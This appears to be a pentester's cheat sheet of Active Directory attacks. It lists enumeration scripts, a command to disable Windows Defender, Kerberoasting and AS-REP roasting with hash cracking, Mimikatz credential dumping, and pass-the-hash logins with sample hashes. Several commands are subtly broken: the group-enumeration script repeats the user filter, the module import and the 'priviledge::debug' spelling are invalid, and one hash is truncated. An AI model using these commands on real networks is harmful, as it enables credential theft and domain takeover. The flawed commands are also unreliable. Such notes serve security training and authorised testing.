# AD Enumeration & Attacks

### Manually Enumeration

#### Basic enumeration

**Use built-in net.exe application**

Who are you

```sh
net user
```

Enumerate all users

```sh
net user /domain
```

Enumerate all groups

```sh
net group /domain
```

**Use powershell script**

Enumerate all users

{% code overflow="wrap" %}
```sh
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "------------------------"
}
```
{% endcode %}

Enumerate all groups

{% code overflow="wrap" %}
```sh
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "------------------------"
}
```
{% endcode %}

#### Service account enumeration (Though SPNs)

When SQL, IIS or other services are integrated into Active Directory, Service Principal Name (SPN) will associate these service to a service account in Active Directory. By enumerating all registered SPNs in the domain, we can obtain infomation about applications running on servers integrated with the the Active Directory.

{% code overflow="wrap" %}
```sh
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```
{% endcode %}

### PowerView

Load powershell module

```sh
Import .\PowerView.ps1
```

For disable virus protection

```sh
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Domain

```sh
Get-Domain
```

#### Domain Policy

```sh
Get-DomainPolicy
```

#### Domain Controller

```sh
Get-DomainController
```

#### Domain Users

**List all users**

```sh
Get-DomainUser
Get-DomainUser -SPN # Enumerate account service
```

**Detail of a specific user**

```sh
Get-DomainUser -Identity <username>
```

**User logged on a machine**

```sh
Get-NetLoggedon -ComputerName <computer-name>
```

**List of computers in the current domain**

```sh
Get-NetComputer| select name, operatingsystem
```

#### Groups

**List all groups in the current domain**

```sh
Get-NetGroup
```

**Detail a specific group**

```sh
Get-NetGroup 'Domain Admins'
```

**List all groups in local**

```sh
Get-NetLocalGroup | Select-Object GroupName
```

**List members of the domain admin group**

```sh
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
```

#### Shares

**Find share on hosts**

```sh
Invoke-ShareFinder  -Verbose
```

**List network shares**

```sh
Get-NetShare
```

**Find all domain shares**

```sh
Find-DomainShare
Find-DomainShare -CheckShareAccess # Find shares with read access
```

**Obtains the file server used by the current domain according to the SPN**

```sh
Get-NetFileServer -Verbose
```

#### Group Policies

```sh
Get-NetGPO
```

### Service account attacks

#### Kerberoasting attack

The service ticket is encrypted through the password hash of the SPN. So, We can request a service ticket from DC, extract and attemp to crack the password of the service account.

**Find all users with an SPN set (likely service accounts)**

```sh
Get-DomainUser -SPN
```

The **Invoke-Kerberoast.ps1** script extends this attack, and can automatically enumerate all service principal names in the domain, request service tickets for them, and export them in a format ready for cracking in both John the Ripper and Hashcat, completely eliminating the need for Mimikatz in this attack.

```sh
Import-Module C:\Windows\Temp\Invoke-Kerberoast.ps1
```

{% code overflow="wrap" %}
```sh
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% endcode %}

```sh
hashcat -m 13100 --force -a 0 hashes.kerberoast rockyou
```

#### ASREPRoasting

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

If don't have any domain username, let's enumerate

```sh
./kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

Then, use `GetNPUsers` to request ticket

```sh
impacket-GetNPUsers domain.local/svc-admin -no-pass
```

Then, crack the hash

```sh
hashcat -m 18200 -a 0 hash.kerberos passwordlist.txt
```

### Lateral movement

#### Mimikatz - Cached Credential

Dump the credentials of all logged-on users:

```sh
mimikatz.exe "priviledge::debug" "sekurlsa::logonpasswords" exit
```

Dump Kerberos TGT and service tickets:

```sh
mimikatz.exe "priviledge::debug" "sekurlsa::tickets" exit
```

#### Pass the hash

Allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password

{% code overflow="wrap" %}
```sh
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
{% endcode %}

{% code overflow="wrap" %}
```sh
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@10.0.0.4
```
{% endcode %}

{% code overflow="wrap" %}
```sh
mimikatz.exe "priviledge::debug" "sekurlsa::pth /user:jeff /domain:doamin /ntlm:d4ad8b9f8ccb87f6d02d7388157ae" exit
```
{% endcode %}
